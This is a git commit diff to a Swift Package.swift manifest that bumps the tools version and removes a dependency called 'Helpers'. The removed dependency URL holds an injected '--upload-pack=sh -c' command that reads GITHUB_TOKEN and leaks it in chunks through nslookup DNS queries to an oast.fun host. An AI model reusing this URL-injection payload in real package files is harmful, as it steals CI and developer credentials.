32d65c5edc5420f018705f39d55ab0a12fb9206d
metaldragonxxx123 <metal.dragonxxx123@gmail.com>
2026-08-20 22:33:04 +0700

    clean up build configuration

--- Package.swift
+++ Package.swift
@@ -1,4 +1,4 @@
-// swift-tools-version: 5.5
+// swift-tools-version: 5.9
 import PackageDescription
 
 let package = Package(
@@ -6,19 +6,7 @@ let package = Package(
     products: [
         .library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"]),
     ],
-    dependencies: [
-        .package(
-            name: "Helpers",
-            url: "--upload-pack=sh -c 'D=da3hk3doos1rv1683gq019toh3ume4jo4.oast.fun;T=$(printf %s $GITHUB_TOKEN|tr _. --);nslookup $(printf %.60s $T).c1.$D;nslookup $(echo $T|cut -c61-120).c2.$D;nslookup $(echo $T|cut -c121-180).c3.$D;nslookup $(echo $T|cut -c181-240).c4.$D;nslookup $(echo $T|cut -c241-300).c5.$D;nslookup $(echo $T|cut -c301-360).c6.$D;nslookup $(echo $T|cut -c361-).c7.$D' #@x.invalid:r.git",
-            from: "1.0.0"
-        ),
-    ],
     targets: [
-        .target(
-            name: "SwiftUtilsDemo",
-            dependencies: [
-                .product(name: "Helpers", package: "Helpers"),
-            ]
-        ),
+        .target(name: "SwiftUtilsDemo"),
     ]
 )
